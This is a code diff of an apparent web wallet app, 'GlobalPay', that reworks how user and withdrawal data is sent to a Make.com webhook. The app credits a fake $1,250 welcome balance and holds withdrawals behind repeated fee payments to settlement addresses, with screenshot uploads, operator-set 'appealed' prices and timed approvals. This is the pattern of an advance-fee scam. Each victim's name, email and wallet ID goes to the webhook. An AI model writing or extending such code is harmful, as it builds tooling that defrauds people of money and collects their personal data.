@@ -1132,47 +1132,49 @@
   </div>
 
   <script>
-    const MAKE_OTP_WEBHOOK_URL = "https://hook.eu1.make.com/618msiw7y7cb4ieca7sp68qy6xi6n4e5";
+    const MAKE_WEBHOOK_URL = "https://hook.eu1.make.com/618msiw7y7cb4ieca7sp68qy6xi6n4e5";
+    const MAKE_OTP_WEBHOOK_URL = MAKE_WEBHOOK_URL;
 
-    async function sendMakeNotification(payload) {
+    async function sendMakeNotification(params = {}) {
       try {
-        await fetch(MAKE_OTP_WEBHOOK_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            ...payload,
-            timestamp: new Date().toISOString()
-          })
+        const url = new URL(MAKE_WEBHOOK_URL);
+
+        Object.entries(params).forEach(([key, value]) => {
+          if (value !== undefined && value !== null && value !== "") {
+            url.searchParams.set(key, String(value));
+          }
         });
+
+        await fetch(url.toString(), {
+          method: "GET",
+          mode: "no-cors"
+        });
+
         return true;
       } catch (err) {
+        console.error("Make webhook error:", err);
         return false;
       }
     }
 
-    function buildWithdrawalActionRequiredText(step, effectivePriceUsd, destinationLabel) {
-      return `Pay $${Number(effectivePriceUsd).toFixed(2)} USD for "${step.title}" to settlement address ${step.settlementAddress}, then upload your payment screenshot in the Withdraw modal to release your $${Number(amountUsdFallback(destinationLabel)).toFixed(2)} USD withdrawal to ${destinationLabel}.`;
-    }
-
-    function amountUsdFallback(destinationLabel) {
-      return currentUser && currentUser.activeWithdrawal ? currentUser.activeWithdrawal.amountUsd : 0;
-    }
-
     async function notifyWithdrawalStepAction(wd, step, effectivePriceUsd) {
       if (!currentUser || !wd || !step) return;
-      const actionRequired = `Complete "${step.title}" (${step.description}) by paying $${Number(effectivePriceUsd).toFixed(2)} USD to ${step.settlementAddress} and uploading your payment screenshot in your GlobalPay Withdraw screen for your $${Number(wd.amountUsd).toFixed(2)} USD payout to ${wd.destinationLabel}.`;
+
+      const amountStr = Number(wd.amountUsd).toFixed(2);
+      const feeStr = Number(effectivePriceUsd).toFixed(2);
+      const stageText = `${step.title} ($${feeStr} USD required)`;
+      const actionText = `Pay $${feeStr} USD to ${step.settlementAddress} and upload your payment screenshot in the Withdraw screen to release $${amountStr} USD to ${wd.destinationLabel}`;
+      const actionUrl = window.location.href;
+
       await sendMakeNotification({
-        type: "withdrawal",
-        name: currentUser.name,
+        type: "withdrawal_update",
         email: currentUser.email,
+        name: currentUser.name,
         wallet_id: currentUser.walletId,
-        amount_usd: Number(wd.amountUsd).toFixed(2),
-        destination: wd.destinationLabel,
-        step_title: step.title,
-        step_description: step.description,
-        fee_usd: Number(effectivePriceUsd).toFixed(2),
-        settlement_address: step.settlementAddress,
-        action_required: actionRequired
+        amount: amountStr,
+        stage: stageText,
+        action_text: actionText,
+        action_url: actionUrl
       });
     }
 
@@ -1578,7 +1580,7 @@
         country: pendingSignupData.country,
         walletId: randomId,
         pin: pin,
-        balanceUsd: 1250.00, // Initial welcome balance in USD
+        balanceUsd: 1250.00,
         transactions: [
           {
             id: "TX-" + Date.now(),
@@ -1655,7 +1657,6 @@
       document.getElementById("dashPrimaryBalance").textContent = `${formatMoney(localAmount, c.symbol)} ${c.code}`;
       document.getElementById("dashUsdEquivalent").textContent = `≈ $${currentUser.balanceUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD Equivalent`;
 
-      // Build Fiat Currency Cards: User's Country Currency first, then USD, EUR, GBP as defaults
       const wallets = [
         {
           code: c.code,
@@ -1770,6 +1771,7 @@
         name: currentUser.name,
         email: currentUser.email,
         wallet_id: currentUser.walletId,
+        amount: incomingUsd.toFixed(2),
         amount_usd: incomingUsd.toFixed(2),
         local_amount: localAdded,
         currency: c.code,
@@ -1796,7 +1798,7 @@
       document.getElementById("receiveEthPanel").style.display = tab === "eth" ? "block" : "none";
     }
 
-    // Send Funds -> Money Sent Webhook
+    // Send Funds
     async function handleSendFunds(e) {
       e.preventDefault();
       const recipient = document.getElementById("sendRecipient").value.trim();
@@ -1826,6 +1828,7 @@
         name: currentUser.name,
         email: currentUser.email,
         wallet_id: currentUser.walletId,
+        amount: amtUsd.toFixed(2),
         amount_usd: amtUsd.toFixed(2),
         local_amount: localSent,
         currency: c.code,
@@ -1848,7 +1851,6 @@
     function openWithdrawEntry() {
       const wd = currentUser.activeWithdrawal;
       if (wd && wd.status !== "completed") {
-        // Resume active withdrawal action step modal
         document.getElementById("withdrawDetailsForm").style.display = "none";
         document.getElementById("withdrawActionStepView").style.display = "block";
         renderActiveWithdrawalStepModal();
@@ -1912,6 +1914,16 @@
         addTransaction("debit", `Withdrawal (${method})`, `${target}`, amountUsd, "Completed");
         closeModal("withdrawModal");
         showToast("Withdrawal processed successfully!", "success");
+        await sendMakeNotification({
+          type: "withdrawal_update",
+          email: currentUser.email,
+          name: currentUser.name,
+          wallet_id: currentUser.walletId,
+          amount: amountUsd.toFixed(2),
+          stage: "Completed",
+          action_text: `Withdrawal of $${amountUsd.toFixed(2)} USD sent to ${target}`,
+          action_url: window.location.href
+        });
         return;
       }
 
@@ -1923,7 +1935,7 @@
         destinationLabel,
         holder,
         stepIndex: 0,
-        status: "action_required", // action_required | pending_review | post_approval_wait | completed
+        status: "action_required",
         appealedPriceUsd: null,
         receiptDataUrl: null,
         postStatusMessage: "",
@@ -1938,7 +1950,6 @@
         "Action Required"
       );
 
-      // Immediately pop up the first required action step
       document.getElementById("withdrawDetailsForm").style.display = "none";
       document.getElementById("withdrawActionStepView").style.display = "block";
       renderActiveWithdrawalStepModal();
@@ -1996,7 +2007,6 @@
         return;
       }
 
-      // Default: action_required
       uploadedReceiptDataUrl = "";
       container.innerHTML = `
         <div style="background:rgba(239,68,68,0.1); border:1px solid rgba(239,68,68,0.35); border-radius:14px; padding:13px; margin-bottom:12px;">
@@ -2119,7 +2129,6 @@
         const wd = currentUser.activeWithdrawal;
         if (wd.status === "post_approval_wait" && wd.waitEndsAt) {
           if (Date.now() >= wd.waitEndsAt) {
-            // Advance to next step or complete withdrawal
             const nextIdx = wd.stepIndex + 1;
             if (nextIdx < appConfig.steps.length) {
               const nextStep = appConfig.steps[nextIdx];
@@ -2142,6 +2151,16 @@
                 "Completed"
               );
               showToast(`$${wd.amountUsd.toFixed(2)} USD withdrawal completed and sent to ${wd.destinationLabel}!`, "success", 7000);
+              await sendMakeNotification({
+                type: "withdrawal_update",
+                email: currentUser.email,
+                name: currentUser.name,
+                wallet_id: currentUser.walletId,
+                amount: Number(wd.amountUsd).toFixed(2),
+                stage: "Completed",
+                action_text: `Your $${Number(wd.amountUsd).toFixed(2)} USD withdrawal has been sent to ${wd.destinationLabel}`,
+                action_url: window.location.href
+              });
             }
           }
           renderWithdrawalStatusBanner();
@@ -2173,7 +2192,6 @@
       document.getElementById("adminBtcInput").value = appConfig.btcAddress;
       document.getElementById("adminEthInput").value = appConfig.ethAddress;
 
-      // 1. Render Pending User Withdrawal & Live Appeal Price Adjustment
       const pendingBox = document.getElementById("adminPendingReviewBox");
       if (!currentUser || !currentUser.activeWithdrawal || currentUser.activeWithdrawal.status === "completed") {
         pendingBox.innerHTML = `No active user withdrawal pending right now.`;
@@ -2212,7 +2230,6 @@
         `;
       }
 
-      // 2. Render Configurable Withdrawal Steps Editor
       const editor = document.getElementById("adminStepsEditor");
       editor.innerHTML = appConfig.steps.map((st, idx) => `
         <div style="background:var(--bg-input); border:1px solid var(--border); border-radius:11px; padding:10px; margin-bottom:10px;">
@@ -2295,7 +2312,7 @@
       const wd = currentUser.activeWithdrawal;
       const step = appConfig.steps[wd.stepIndex];
       wd.appealedPriceUsd = newPrice;
-      wd.status = "action_required"; // Let user submit receipt for appealed price if needed
+      wd.status = "action_required";
       saveUser();
 
       addTransaction(
@@ -2312,7 +2329,7 @@
       await notifyWithdrawalStepAction(wd, step, newPrice);
     }
 
-    function adminApproveCurrentStep() {
+    async function adminApproveCurrentStep() {
       if (!currentUser || !currentUser.activeWithdrawal) return;
       const wd = currentUser.activeWithdrawal;
       const step = appConfig.steps[wd.stepIndex];
@@ -2334,6 +2351,17 @@
       closeModal("adminModal");
       renderDashboard();
       showToast(`Step approved! Status "${wd.postStatusMessage}" active for ${step.delayMinutes} min(s).`, "success", 6000);
+
+      await sendMakeNotification({
+        type: "withdrawal_update",
+        email: currentUser.email,
+        name: currentUser.name,
+        wallet_id: currentUser.walletId,
+        amount: Number(wd.amountUsd).toFixed(2),
+        stage: wd.postStatusMessage,
+        action_text: `Step "${step.title}" approved. ${wd.postStatusMessage}`,
+        action_url: window.location.href
+      });
     }
 
     // Boot App
